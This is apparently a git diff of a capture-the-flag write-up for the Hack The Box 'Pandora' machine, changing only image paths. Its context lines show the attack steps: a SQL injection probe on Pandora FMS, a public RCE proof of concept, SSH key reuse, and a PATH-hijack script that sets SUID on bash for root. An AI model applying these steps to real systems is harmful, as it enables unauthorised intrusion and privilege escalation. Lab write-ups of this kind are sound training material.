@@ -118,17 +118,17 @@ ssh daniel@10.129.1.103
 
 Besides daniel & root there is another user on this box. Noted!
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 there are two site configurations are in `/etc/apache2/sites-enabled`
 
 `000-default.conf` is hosting the default webserver on port 80
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 `pandora.conf` on the other hand is only listening on localhost and under the server name `pandora.panda.htb`. It’s hosted out of `/var/www/pandora`, and running as matt.
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 Let's setup port forwarding and check it out
 
@@ -148,11 +148,11 @@ ssh daniel@panda.htb -L 8000:localhost:80
 
 Now we can access it at [http://pandora.panda.htb:8000](http://pandora.panda.htb:8000)
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 It's an instance of Pandora FMS with a version on the bottom
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 There is a RCE available for this version, discovered a POC on github
 
@@ -168,7 +168,7 @@ session_id='
 
 {% embed url="http://127.0.0.1:8000/pandora_console/include/chart_generator.php?session_id=%27" %}
 
-<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
 it complains about the number of columns being wrong
 
@@ -254,7 +254,7 @@ python3 pandorafms_7.44.py -t http://pandora.panda.htb:8000/ -c g4e01qdgk36mfdh9
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:blue;">Shell as matt</mark>
 
@@ -281,17 +281,17 @@ ssh -i matt_id_rsa matt@10.129.2.45
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### <mark style="color:$primary;">Linpeas</mark>
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:blue;">SUID Path hijacking tar</mark>
 
 Discovered an interesting SUID, I'll run it and check what happens
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 It’s doing a backup, with a long list of paths, all in `/var/www/pandora`. At the top it references `tar` a couple times, which suggests it’s using `tar` to compress/archive
 
@@ -303,7 +303,7 @@ It’s doing a backup, with a long list of paths, all in `/var/www/pandora`. At 
 ltrace /usr/bin/pandora_backup
 ```
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 It crashes because it doesn’t have permissions to `/root/.backup/pandora-backup.tar.gz`, which makes sense since `ltrace` drops the privs from SUID.
 
@@ -317,7 +317,7 @@ I’ll work from `/dev/shm`, and add that to the current user’s `PATH`:
 export PATH=/dev/shm:$PATH
 ```
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now the first place it will look for `tar` is `/dev/shm`.
 
@@ -328,10 +328,10 @@ echo -e '#!/bin/bash\n\nchmod +s /bin/bash' > tar
 chmod +x tar
 ```
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now I’ll run `pandora_backup`, and when it reaches the call to `tar`, it will set the SUID on bash
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 With the SUID set on bash it was easy to escalate privileges to root
